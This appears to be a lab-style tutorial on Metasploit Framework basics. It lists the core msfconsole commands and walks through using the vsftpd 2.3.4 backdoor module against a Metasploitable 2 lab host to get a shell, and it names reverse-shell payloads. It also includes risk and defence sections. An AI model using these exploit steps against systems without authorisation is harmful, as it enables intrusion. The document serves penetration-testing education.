# Metasploit Framework Basics

## Objective
Understand the basics of using Metasploit for exploitation and post-exploitation in a controlled lab environment.

---

## What is Metasploit?

Metasploit Framework is an open-source tool for:

- Vulnerability exploitation  
- Payload generation  
- Post-exploitation  
- Penetration testing automation  

It allows testers to simulate real-world attacks in a safe environment.

---

## Tool

Metasploit Framework (msfconsole)

---

## Starting Metasploit

In Kali Linux:

```
msfconsole
```

You will see the Metasploit banner and prompt: `msf6 >`

---

## Basic Commands

| Command | Description |
|---------|-------------|
| `search <vulnerability>` | Search available exploits |
| `use <exploit>` | Select an exploit module |
| `show options` | Show module configuration options |
| `set RHOSTS <target>` | Set target host |
| `set RPORT <port>` | Set target port |
| `set PAYLOAD <payload>` | Set payload type |
| `exploit` | Launch the exploit |

---

## Example Lab: Exploiting Metasploitable 2

1. Search for vsftpd vulnerability:

```
search vsftpd
```

2. Select exploit:

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

3. Set options:

```
set RHOSTS 192.168.56.101
```

4. Launch exploit:

```
exploit
```

5. If successful, you get a shell on the target.

---

## Common Payloads

- `cmd/unix/reverse` → Unix shell  
- `linux/x86/meterpreter/reverse_tcp` → Meterpreter shell  
- `windows/meterpreter/reverse_tcp` → Windows Meterpreter shell  

---

## Observations

- Metasploit simplifies exploit execution
- Useful for testing vulnerabilities in lab environments
- Allows post-exploitation modules to enumerate users, files, and network info

---

## Risk Impact

Improper use on live systems can:

- Crash the target server
- Trigger IDS/IPS alerts
- Cause legal issues if unauthorized

Always use **controlled labs**.

---

## Mitigation & Defense

- Keep systems patched  
- Monitor for unusual connections  
- Disable unused services  
- Harden OS and applications  

---

## Reflection

Metasploit teaches how exploits and payloads work, helping testers understand attack methodology. It’s essential for both learning exploitation and demonstrating vulnerabilities in a controlled environment.
